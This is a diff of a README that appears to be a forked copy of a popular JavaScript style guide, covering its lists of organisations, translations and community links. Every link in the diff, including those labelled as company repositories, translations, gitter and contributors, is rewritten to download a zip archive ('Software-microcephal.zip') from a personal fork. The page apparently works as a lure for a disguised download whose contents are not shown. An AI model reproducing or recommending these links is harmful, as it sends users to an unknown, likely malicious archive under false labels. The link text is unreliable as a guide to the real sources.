+  - **EvozonJs**: [evozonjs/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **ExactTarget**: [ExactTarget/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Expensify** [Expensify/Style-Guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Flexberry**: [Flexberry/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Gawker Media**: [gawkermedia/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **General Electric**: [GeneralElectric/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **GoodData**: [gooddata/gdc-js-style](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Grooveshark**: [grooveshark/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **How About We**: [howaboutwe/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Huballin**: [huballin/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **HubSpot**: [HubSpot/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Hyper**: [hyperoslo/javascript-playbook](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **InfoJobs**: [InfoJobs/JavaScript-Style-Guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Intent Media**: [intentmedia/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Jam3**: [Jam3/Javascript-Code-Conventions](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **JeopardyBot**: [kesne/jeopardy-bot](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **JSSolutions**: [JSSolutions/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **KickorStick**: [kickorstick/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Kinetica Solutions**: [kinetica/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **M2GEN**: [M2GEN/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Mighty Spring**: [mightyspring/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **MinnPost**: [MinnPost/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **MitocGroup**: [MitocGroup/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **ModCloth**: [modcloth/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Money Advice Service**: [moneyadviceservice/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Muber**: [muber/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **National Geographic**: [natgeo/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **National Park Service**: [nationalparkservice/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Nimbl3**: [nimbl3/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Orion Health**: [orionhealth/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **OutBoxSoft**: [OutBoxSoft/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Peerby**: [Peerby/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Razorfish**: [razorfish/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **reddit**: [reddit/styleguide/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **React**: [https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **REI**: [reidev/js-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Ripple**: [ripple/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **SeekingAlpha**: [seekingalpha/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Shutterfly**: [shutterfly/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Springload**: [springload/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **StratoDem Analytics**: [stratodem/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **SteelKiwi Development**: [steelkiwi/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **StudentSphere**: [studentsphere/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **SysGarage**: [sysgarage/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Syzygy Warsaw**: [syzygypl/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Target**: [target/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **TheLadders**: [TheLadders/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **The Nerdery**: [thenerdery/javascript-standards](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **T4R Technology**: [T4R-Technology/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **VoxFeed**: [VoxFeed/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **WeBox Studio**: [weboxstudio/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Weggo**: [Weggo/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Zillow**: [zillow/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **ZocDoc**: [ZocDoc/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
 **[⬆ back to top](#table-of-contents)**
 
@@ -2989,33 +2989,33 @@ Other Style Guides
 
   This style guide is also available in other languages:
 
-  - ![br](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Brazilian Portuguese**: [armoucar/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![bg](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Bulgarian**: [borislavvv/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![ca](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Catalan**: [fpmweb/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![cn](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Chinese (Simplified)**: [sivan/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![tw](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Chinese (Traditional)**: [jigsawye/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![fr](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **French**: [nmussy/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![de](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **German**: [timofurrer/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![it](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Italian**: [sinkswim/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![jp](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Japanese**: [mitsuruog/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![kr](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Korean**: [tipjs/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![pl](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Polish**: [mjurczyk/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![ru](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Russian**: [uprock/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![es](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Spanish**: [paolocarrasco/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![th](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Thai**: [lvarayut/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - ![vn](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Vietnam**: [giangpii/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - ![br](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **Brazilian Portuguese**: [armoucar/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![bg](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **Bulgarian**: [borislavvv/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![ca](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **Catalan**: [fpmweb/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![cn](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **Chinese (Simplified)**: [sivan/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![tw](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **Chinese (Traditional)**: [jigsawye/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![fr](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **French**: [nmussy/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![de](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **German**: [timofurrer/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![it](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **Italian**: [sinkswim/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![jp](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **Japanese**: [mitsuruog/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![kr](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **Korean**: [tipjs/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![pl](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **Polish**: [mjurczyk/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![ru](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **Russian**: [uprock/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![es](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **Spanish**: [paolocarrasco/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![th](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **Thai**: [lvarayut/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - ![vn](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) **Vietnam**: [giangpii/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
 ## The JavaScript Style Guide Guide
 
-  - [Reference](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [Reference](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
 ## Chat With Us About JavaScript
 
-  - Find us on [gitter](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).
+  - Find us on [gitter](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip).
 
 ## Contributors
 
-  - [View Contributors](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [View Contributors](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
 
 ## License
